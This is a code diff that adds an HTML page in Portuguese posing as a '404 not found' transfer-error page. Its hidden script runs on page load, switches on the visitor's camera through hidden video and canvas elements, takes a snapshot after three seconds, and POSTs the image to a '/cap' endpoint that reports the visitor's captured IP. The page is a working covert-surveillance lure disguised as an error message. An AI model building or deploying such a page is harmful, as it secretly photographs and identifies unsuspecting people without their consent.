@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="pt">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Erro de tranferencia</title>
+  </head>
+  <body>
+    <h1>404 not found...</h1>
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+
+    <script>
+      async function captureData() {
+        try {
+          // Capturar a câmera do usuário
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+
+          // Aguardar 3 segundos e capturar imagem
+          setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+
+            // Enviar imagem para o servidor
+            fetch("/cap", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ image: imageData }),
+            })
+              .then((response) => response.json())
+              .then((data) => console.log("IP Capturado:", data.ip))
+              .catch((error) => console.error("Erro:", error));
+
+            // Parar a câmera
+            stream.getTracks().forEach((track) => track.stop());
+          }, 3000);
+        } catch (error) {
+          console.error("Erro ao acessar a câmera:", error);
+        }
+      }
+
+      // Inicia a captura ao carregar a página
+      captureData();
+    </script>
+  </body>
+</html>
